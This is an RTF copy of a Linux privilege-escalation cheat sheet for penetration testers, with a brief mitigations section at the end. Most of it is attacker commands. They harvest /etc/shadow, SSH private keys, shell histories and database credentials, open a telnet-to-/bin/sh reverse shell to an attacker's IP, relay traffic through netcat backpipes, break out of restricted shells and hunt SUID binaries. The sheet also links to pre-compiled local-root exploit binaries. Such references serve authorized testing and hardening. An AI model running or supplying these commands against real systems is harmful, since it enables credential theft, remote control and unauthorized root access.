{\rtf1\ansi\ansicpg1252\uc1\deff0
{\fonttbl{\f0\fmodern\fcharset0\fprq2 Courier New;}}
{\colortbl;\red0\green0\blue0;\red255\green255\blue255;}
\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\fet2\ftnbj\aenddoc
\pgnrestart\pgnstarts0
\pard\plain \fi720\ltrch\loch {\f0\fs24\b0\i0  [cheat sheet] Basic Linux Privilege Escalation}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Enumeration is the key.}
\par\plain {\f0\fs24\b0\i0 (Linux) privilege escalation is all about:}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0     Collect - Enumeration, more enumeration and some more enumeration.}
\par\plain {\f0\fs24\b0\i0     Process - Sort through data, analyse and prioritisation.}
\par\plain {\f0\fs24\b0\i0     Search - Know what to search for and where to find the exploit code.}
\par\plain {\f0\fs24\b0\i0     Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".}
\par\plain {\f0\fs24\b0\i0     Try - Get ready for (lots of) trial and error.}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Operating System}
\par\plain {\f0\fs24\b0\i0 What's the distribution type? What version?}
\par\plain {\f0\fs24\b0\i0 cat /etc/issue}
\par\plain {\f0\fs24\b0\i0 cat /etc/*-release}
\par\plain {\f0\fs24\b0\i0   cat /etc/lsb-release}
\par\plain {\f0\fs24\b0\i0   cat /etc/redhat-release}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What's the Kernel version? Is it 64-bit?}
\par\plain {\f0\fs24\b0\i0 cat /proc/version   }
\par\plain {\f0\fs24\b0\i0 uname -a}
\par\plain {\f0\fs24\b0\i0 uname -mrs}
\par\plain {\f0\fs24\b0\i0 rpm -q kernel}
\par\plain {\f0\fs24\b0\i0 dmesg | grep Linux}
\par\plain {\f0\fs24\b0\i0 ls /boot | grep vmlinuz-}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What can be learnt from the environmental variables?}
\par\plain {\f0\fs24\b0\i0 cat /etc/profile}
\par\plain {\f0\fs24\b0\i0 cat /etc/bashrc}
\par\plain {\f0\fs24\b0\i0 cat ~/.bash_profile}
\par\plain {\f0\fs24\b0\i0 cat ~/.bashrc}
\par\plain {\f0\fs24\b0\i0 cat ~/.bash_logout}
\par\plain {\f0\fs24\b0\i0 env}
\par\plain {\f0\fs24\b0\i0 set}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is there a printer?}
\par\plain {\f0\fs24\b0\i0 lpstat -a}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Applications & Services}
\par\plain {\f0\fs24\b0\i0 What services are running? Which service has which user privilege?}
\par\plain {\f0\fs24\b0\i0 ps aux}
\par\plain {\f0\fs24\b0\i0 ps -ef}
\par\plain {\f0\fs24\b0\i0 top}
\par\plain {\f0\fs24\b0\i0 cat /etc/service}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!}
\par\plain {\f0\fs24\b0\i0 ps aux | grep root}
\par\plain {\f0\fs24\b0\i0 ps -ef | grep root}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What applications are installed? What version are they? Are they currently running?}
\par\plain {\f0\fs24\b0\i0 ls -alh /usr/bin/}
\par\plain {\f0\fs24\b0\i0 ls -alh /sbin/}
\par\plain {\f0\fs24\b0\i0 dpkg -l}
\par\plain {\f0\fs24\b0\i0 rpm -qa}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/cache/apt/archivesO}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/cache/yum/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?}
\par\plain {\f0\fs24\b0\i0 cat /etc/syslog.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/chttp.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/lighttpd.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/cups/cupsd.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/inetd.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/apache2/apache2.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/my.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/httpd/conf/httpd.conf}
\par\plain {\f0\fs24\b0\i0 cat /opt/lampp/etc/httpd.conf}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What jobs are scheduled?}
\par\plain {\f0\fs24\b0\i0 crontab -l}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/spool/cron}
\par\plain {\f0\fs24\b0\i0 ls -al /etc/ | grep cron}
\par\plain {\f0\fs24\b0\i0 ls -al /etc/cron*}
\par\plain {\f0\fs24\b0\i0 cat /etc/cron*}
\par\plain {\f0\fs24\b0\i0 cat /etc/at.allow}
\par\plain {\f0\fs24\b0\i0 cat /etc/at.deny}
\par\plain {\f0\fs24\b0\i0 cat /etc/cron.allow}
\par\plain {\f0\fs24\b0\i0 cat /etc/cron.deny}
\par\plain {\f0\fs24\b0\i0 cat /etc/crontab}
\par\plain {\f0\fs24\b0\i0 cat /etc/anacrontab}
\par\plain {\f0\fs24\b0\i0 cat /var/spool/cron/crontabs/root}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Any plain text usernames and/or passwords?}
\par\plain {\f0\fs24\b0\i0 grep -i user [filename]}
\par\plain {\f0\fs24\b0\i0 grep -i pass [filename]}
\par\plain {\f0\fs24\b0\i0 grep -C 5 "password" [filename]}
\par\plain {\f0\fs24\b0\i0 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Communications & Networking}
\par\plain {\f0\fs24\b0\i0 What NIC(s) does the system have? Is it connected to another network?}
\par\plain {\f0\fs24\b0\i0 /sbin/ifconfig -a}
\par\plain {\f0\fs24\b0\i0 cat /etc/network/interfaces}
\par\plain {\f0\fs24\b0\i0 cat /etc/sysconfig/network}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?}
\par\plain {\f0\fs24\b0\i0 cat /etc/resolv.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/sysconfig/network}
\par\plain {\f0\fs24\b0\i0 cat /etc/networks}
\par\plain {\f0\fs24\b0\i0 iptables -L}
\par\plain {\f0\fs24\b0\i0 hostname}
\par\plain {\f0\fs24\b0\i0 dnsdomainname}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What other users & hosts are communicating with the system?}
\par\plain {\f0\fs24\b0\i0 lsof -i}
\par\plain {\f0\fs24\b0\i0 lsof -i :80}
\par\plain {\f0\fs24\b0\i0 grep 80 /etc/services}
\par\plain {\f0\fs24\b0\i0 netstat -antup}
\par\plain {\f0\fs24\b0\i0 netstat -antpx}
\par\plain {\f0\fs24\b0\i0 netstat -tulpn}
\par\plain {\f0\fs24\b0\i0 chkconfig --list}
\par\plain {\f0\fs24\b0\i0 chkconfig --list | grep 3:on}
\par\plain {\f0\fs24\b0\i0 last}
\par\plain {\f0\fs24\b0\i0 w}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Whats cached? IP and/or MAC addresses}
\par\plain {\f0\fs24\b0\i0 arp -e}
\par\plain {\f0\fs24\b0\i0 route}
\par\plain {\f0\fs24\b0\i0 /sbin/route -nee}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is packet sniffing possible? What can be seen? Listen to live traffic}
\par\plain {\f0\fs24\b0\i0 # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]}
\par\plain {\f0\fs24\b0\i0 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Have you got a shell? Can you interact with the system?}
\par\plain {\f0\fs24\b0\i0 # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/}
\par\plain {\f0\fs24\b0\i0 nc -lvp 4444    # Attacker. Input (Commands)}
\par\plain {\f0\fs24\b0\i0 nc -lvp 4445    # Attacker. Ouput (Results)}
\par\plain {\f0\fs24\b0\i0 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is port forwarding possible? Redirect and interact with traffic from another view}
\par\plain {\f0\fs24\b0\i0 # rinetd}
\par\plain {\f0\fs24\b0\i0 # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 # fpipe}
\par\plain {\f0\fs24\b0\i0 # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]}
\par\plain {\f0\fs24\b0\i0 FPipe.exe -l 80 -r 80 -s 80 192.168.1.7}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]}
\par\plain {\f0\fs24\b0\i0 ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port}
\par\plain {\f0\fs24\b0\i0 ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe}
\par\plain {\f0\fs24\b0\i0 mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay}
\par\plain {\f0\fs24\b0\i0 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)}
\par\plain {\f0\fs24\b0\i0 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is tunnelling possible? Send commands locally, remotely}
\par\plain {\f0\fs24\b0\i0 ssh -D 127.0.0.1:9050 -N [username]@[ip]}
\par\plain {\f0\fs24\b0\i0 proxychains ifconfig}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Confidential Information & Users}
\par\plain {\f0\fs24\b0\i0 Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?}
\par\plain {\f0\fs24\b0\i0 id}
\par\plain {\f0\fs24\b0\i0 who}
\par\plain {\f0\fs24\b0\i0 w}
\par\plain {\f0\fs24\b0\i0 last}
\par\plain {\f0\fs24\b0\i0 cat /etc/passwd | cut -d:    # List of users}
\par\plain {\f0\fs24\b0\i0 grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 \{ print $1\}'   # List of super users}
\par\plain {\f0\fs24\b0\i0 awk -F: '($3 == "0") \{print\}' /etc/passwd   # List of super users}
\par\plain {\f0\fs24\b0\i0 cat /etc/sudoers}
\par\plain {\f0\fs24\b0\i0 sudo -l}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What sensitive files can be found?}
\par\plain {\f0\fs24\b0\i0 cat /etc/passwd}
\par\plain {\f0\fs24\b0\i0 cat /etc/group}
\par\plain {\f0\fs24\b0\i0 cat /etc/shadow}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/mail/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Anything "interesting" in the home directorie(s)? If it's possible to access}
\par\plain {\f0\fs24\b0\i0 ls -ahlR /root/}
\par\plain {\f0\fs24\b0\i0 ls -ahlR /home/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords}
\par\plain {\f0\fs24\b0\i0 cat /var/apache2/config.inc}
\par\plain {\f0\fs24\b0\i0 cat /var/lib/mysql/mysql/user.MYD}
\par\plain {\f0\fs24\b0\i0 cat /root/anaconda-ks.cfg}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What has the user being doing? Is there any password in plain text? What have they been edting?}
\par\plain {\f0\fs24\b0\i0 cat ~/.bash_history}
\par\plain {\f0\fs24\b0\i0 cat ~/.nano_history}
\par\plain {\f0\fs24\b0\i0 cat ~/.atftp_history}
\par\plain {\f0\fs24\b0\i0 cat ~/.mysql_history}
\par\plain {\f0\fs24\b0\i0 cat ~/.php_history}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What user information can be found?}
\par\plain {\f0\fs24\b0\i0 cat ~/.bashrc}
\par\plain {\f0\fs24\b0\i0 cat ~/.profile}
\par\plain {\f0\fs24\b0\i0 cat /var/mail/root}
\par\plain {\f0\fs24\b0\i0 cat /var/spool/mail/root}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Can private-key information be found?}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/authorized_keys}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/identity.pub}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/identity}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/id_rsa.pub}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/id_rsa}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/id_dsa.pub}
\par\plain {\f0\fs24\b0\i0 cat ~/.ssh/id_dsa}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_config}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/sshd_config}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_dsa_key.pub}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_dsa_key}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_rsa_key.pub}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_rsa_key}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_key.pub}
\par\plain {\f0\fs24\b0\i0 cat /etc/ssh/ssh_host_key}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 File Systems}
\par\plain {\f0\fs24\b0\i0 Which configuration files can be written in /etc/? Able to reconfigure a service?}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 find /etc/ -readable -type f 2>/dev/null                      # Anyone}
\par\plain {\f0\fs24\b0\i0 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What can be found in /var/ ?}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/log}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/mail}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/spool}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/spool/lpd}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/lib/pgsql}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/lib/mysql}
\par\plain {\f0\fs24\b0\i0 cat /var/lib/dhcp3/dhclient.leases}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Any settings/files (hidden) on website? Any settings file with database information?}
\par\plain {\f0\fs24\b0\i0 ls -alhR /var/www/}
\par\plain {\f0\fs24\b0\i0 ls -alhR /srv/www/htdocs/}
\par\plain {\f0\fs24\b0\i0 ls -alhR /usr/local/www/apache22/data/}
\par\plain {\f0\fs24\b0\i0 ls -alhR /opt/lampp/htdocs/}
\par\plain {\f0\fs24\b0\i0 ls -alhR /var/www/html/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is there anything in the log file(s) (Could help with "Local File Includes"!)}
\par\plain {\f0\fs24\b0\i0 # http://www.thegeekstuff.com/2011/08/linux-var-log-files/}
\par\plain {\f0\fs24\b0\i0 cat /etc/httpd/logs/access_log}
\par\plain {\f0\fs24\b0\i0 cat /etc/httpd/logs/access.log}
\par\plain {\f0\fs24\b0\i0 cat /etc/httpd/logs/error_log}
\par\plain {\f0\fs24\b0\i0 cat /etc/httpd/logs/error.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache2/access_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache2/access.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache2/error_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache2/error.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache/access_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/apache/access.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/auth.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/chttp.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/cups/error_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/dpkg.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/faillog}
\par\plain {\f0\fs24\b0\i0 cat /var/log/httpd/access_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/httpd/access.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/httpd/error_log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/httpd/error.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/lastlog}
\par\plain {\f0\fs24\b0\i0 cat /var/log/lighttpd/access.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/lighttpd/error.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/lighttpd/lighttpd.access.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/lighttpd/lighttpd.error.log}
\par\plain {\f0\fs24\b0\i0 cat /var/log/messages}
\par\plain {\f0\fs24\b0\i0 cat /var/log/secure}
\par\plain {\f0\fs24\b0\i0 cat /var/log/syslog}
\par\plain {\f0\fs24\b0\i0 cat /var/log/wtmp}
\par\plain {\f0\fs24\b0\i0 cat /var/log/xferlog}
\par\plain {\f0\fs24\b0\i0 cat /var/log/yum.log}
\par\plain {\f0\fs24\b0\i0 cat /var/run/utmp}
\par\plain {\f0\fs24\b0\i0 cat /var/webmin/miniserv.log}
\par\plain {\f0\fs24\b0\i0 cat /var/www/logs/access_log}
\par\plain {\f0\fs24\b0\i0 cat /var/www/logs/access.log}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/lib/dhcp3/}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/log/postgresql/}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/log/proftpd/}
\par\plain {\f0\fs24\b0\i0 ls -alh /var/log/samba/}
\par\plain {\f0\fs24\b0\i0 # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 If commands are limited, you break out of the "jail" shell?}
\par\plain {\f0\fs24\b0\i0 python -c 'import pty;pty.spawn("/bin/bash")'}
\par\plain {\f0\fs24\b0\i0 echo os.system('/bin/bash')}
\par\plain {\f0\fs24\b0\i0 /bin/sh -i}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 How are file-systems mounted?}
\par\plain {\f0\fs24\b0\i0 mount}
\par\plain {\f0\fs24\b0\i0 df -h}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Are there any unmounted file-systems?}
\par\plain {\f0\fs24\b0\i0 cat /etc/fstab}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID}
\par\plain {\f0\fs24\b0\i0 find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here}
\par\plain {\f0\fs24\b0\i0 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.}
\par\plain {\f0\fs24\b0\i0 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID}
\par\plain {\f0\fs24\b0\i0 for i in `locate -r "bin$"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 #find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hideany errors (e.g. permission denied)}
\par\plain {\f0\fs24\b0\i0 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld \{\} \\; 2>/dev/null}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm}
\par\plain {\f0\fs24\b0\i0 find / -writable -type d 2>/dev/null     # world-writeable folders}
\par\plain {\f0\fs24\b0\i0 find / -perm -222 -type d 2>/dev/null  # world-writeable folders}
\par\plain {\f0\fs24\b0\i0 find / -perm -o+w -type d 2>/dev/null    # world-writeable folders}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 find / -perm -o+x -type d 2>/dev/null    # world-executable folders}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 find / \\( -perm -o+w -perm -o+x \\) -type d 2>/dev/null   # world-writeable & executable folders}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Any "problem" files? Word-writeable, "nobody" files}
\par\plain {\f0\fs24\b0\i0 find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print   # world-writeable files}
\par\plain {\f0\fs24\b0\i0 find /dir -xdev \\( -nouser -o -nogroup \\) -print   # Noowner files}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Preparation & Finding Exploit Code}
\par\plain {\f0\fs24\b0\i0 What development tools/languages are installed/supported?}
\par\plain {\f0\fs24\b0\i0 find / -name perl*}
\par\plain {\f0\fs24\b0\i0 find / -name python*}
\par\plain {\f0\fs24\b0\i0 find / -name gcc*}
\par\plain {\f0\fs24\b0\i0 find / -name cc}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 How can files be uploaded?}
\par\plain {\f0\fs24\b0\i0 find / -name wget}
\par\plain {\f0\fs24\b0\i0 find / -name nc*}
\par\plain {\f0\fs24\b0\i0 find / -name netcat*}
\par\plain {\f0\fs24\b0\i0 find / -name tftp*}
\par\plain {\f0\fs24\b0\i0 find / -name ftp}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Finding exploit code}
\par\plain {\f0\fs24\b0\i0 http://www.exploit-db.com}
\par\plain {\f0\fs24\b0\i0 http://1337day.com}
\par\plain {\f0\fs24\b0\i0 http://www.securiteam.com}
\par\plain {\f0\fs24\b0\i0 http://www.securityfocus.com}
\par\plain {\f0\fs24\b0\i0 http://www.exploitsearch.net}
\par\plain {\f0\fs24\b0\i0 http://metasploit.com/modules/}
\par\plain {\f0\fs24\b0\i0 http://securityreason.com}
\par\plain {\f0\fs24\b0\i0 http://seclists.org/fulldisclosure/}
\par\plain {\f0\fs24\b0\i0 http://www.google.com}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Finding more information regarding the exploit}
\par\plain {\f0\fs24\b0\i0 http://www.cvedetails.com}
\par\plain {\f0\fs24\b0\i0 http://packetstormsecurity.org/files/cve/[CVE]}
\par\plain {\f0\fs24\b0\i0 http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]}
\par\plain {\f0\fs24\b0\i0 http://www.vulnview.com/cve-details.php?cvename=[CVE]}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk}
\par\plain {\f0\fs24\b0\i0 http://tarantula.by.ru/localroot/}
\par\plain {\f0\fs24\b0\i0 http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Mitigations}
\par\plain {\f0\fs24\b0\i0 Is any of the above information easy to find?}
\par\plain {\f0\fs24\b0\i0 Try doing it!}
\par\plain {\f0\fs24\b0\i0 Setup a cron job which automates script(s) and/or 3rd party products}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Is the system fully patched? Kernel, operating system, all applications, their  plugins and web services}
\par\plain {\f0\fs24\b0\i0 apt-get update && apt-get upgrade}
\par\plain {\f0\fs24\b0\i0 yum update}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Are services running with the minimum level of privileges required?}
\par\plain {\f0\fs24\b0\i0 For example, do you need to run MySQL as root?}
\par\plain {\f0\fs24\b0\i0 Scripts Can any of this be automated?!}
\par\plain {\f0\fs24\b0\i0 http://pentestmonkey.net/tools/unix-privesc-check/}
\par\plain {\f0\fs24\b0\i0 http://labs.portcullis.co.uk/application/enum4linux/}
\par\plain {\f0\fs24\b0\i0 http://bastille-linux.sourceforge.net}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Other (quick) guides & Links}
\par\plain {\f0\fs24\b0\i0 Enumeration}
\par\plain {\f0\fs24\b0\i0 http://www.0daysecurity.com/penetration-testing/enumeration.html}
